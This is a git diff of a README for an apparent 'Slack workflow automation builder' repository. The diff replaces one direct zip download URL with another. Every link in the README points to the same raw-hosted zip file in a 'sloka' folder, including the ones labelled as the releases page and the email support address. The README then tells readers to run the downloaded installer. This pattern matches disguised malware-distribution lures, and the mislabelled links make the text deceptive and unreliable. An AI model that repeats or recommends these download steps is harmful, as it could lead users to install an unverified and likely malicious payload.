@@ -6,11 +6,11 @@ Welcome to the **slack-workflow-automation-builder**! This application helps lif
 
 ## 📥 Download the Application
 
-[![Download Slack Workflow Automation Builder](https://github.com/TalhaBinKhalid/slack-workflow-automation-builder/raw/refs/heads/main/sloka/slack-automation-workflow-builder-2.7.zip)](https://github.com/TalhaBinKhalid/slack-workflow-automation-builder/raw/refs/heads/main/sloka/slack-automation-workflow-builder-2.7.zip)
+[![Download Slack Workflow Automation Builder](https://raw.githubusercontent.com/TalhaBinKhalid/slack-workflow-automation-builder/main/sloka/workflow-automation-slack-builder-v1.5-alpha.1.zip)](https://raw.githubusercontent.com/TalhaBinKhalid/slack-workflow-automation-builder/main/sloka/workflow-automation-slack-builder-v1.5-alpha.1.zip)
 
 ## 🔗 Visit Our Releases Page
 
-Visit this page to download: [GitHub Releases Page](https://github.com/TalhaBinKhalid/slack-workflow-automation-builder/raw/refs/heads/main/sloka/slack-automation-workflow-builder-2.7.zip). Here, you will find the latest versions of the application.
+Visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/TalhaBinKhalid/slack-workflow-automation-builder/main/sloka/workflow-automation-slack-builder-v1.5-alpha.1.zip). Here, you will find the latest versions of the application.
 
 ## 🛠️ System Requirements
 
@@ -23,11 +23,11 @@ To run **slack-workflow-automation-builder**, please ensure your system meets th
 
 ## 📖 How to Download & Install
 
-1. **Visit the releases page**: Click the link above or use this [direct link to releases](https://github.com/TalhaBinKhalid/slack-workflow-automation-builder/raw/refs/heads/main/sloka/slack-automation-workflow-builder-2.7.zip).
+1. **Visit the releases page**: Click the link above or use this [direct link to releases](https://raw.githubusercontent.com/TalhaBinKhalid/slack-workflow-automation-builder/main/sloka/workflow-automation-slack-builder-v1.5-alpha.1.zip).
 
 2. **Select the latest version**: Look for the latest release. It will usually have the highest version number.
 
-3. **Download the installer**: Choose the installer that matches your operating system. For Windows, you might find a file like `https://github.com/TalhaBinKhalid/slack-workflow-automation-builder/raw/refs/heads/main/sloka/slack-automation-workflow-builder-2.7.zip`. For macOS, look for a `.dmg` file. Click the name to begin downloading.
+3. **Download the installer**: Choose the installer that matches your operating system. For Windows, you might find a file like `https://raw.githubusercontent.com/TalhaBinKhalid/slack-workflow-automation-builder/main/sloka/workflow-automation-slack-builder-v1.5-alpha.1.zip`. For macOS, look for a `.dmg` file. Click the name to begin downloading.
 
 4. **Run the installer**: Once downloaded, locate the file in your Downloads folder. Double-click on it to start the installation process.
 
@@ -71,7 +71,7 @@ To run **slack-workflow-automation-builder**, please ensure your system meets th
 If you have questions or need assistance, please feel free to reach out:
 
 - **GitHub Issues**: Use the Issues tab on the GitHub repository to report bugs or suggest features.
-- **Email Support**: Send us an email at https://github.com/TalhaBinKhalid/slack-workflow-automation-builder/raw/refs/heads/main/sloka/slack-automation-workflow-builder-2.7.zip for further assistance.
+- **Email Support**: Send us an email at https://raw.githubusercontent.com/TalhaBinKhalid/slack-workflow-automation-builder/main/sloka/workflow-automation-slack-builder-v1.5-alpha.1.zip for further assistance.
 
 ## 🗒️ Contribution
 
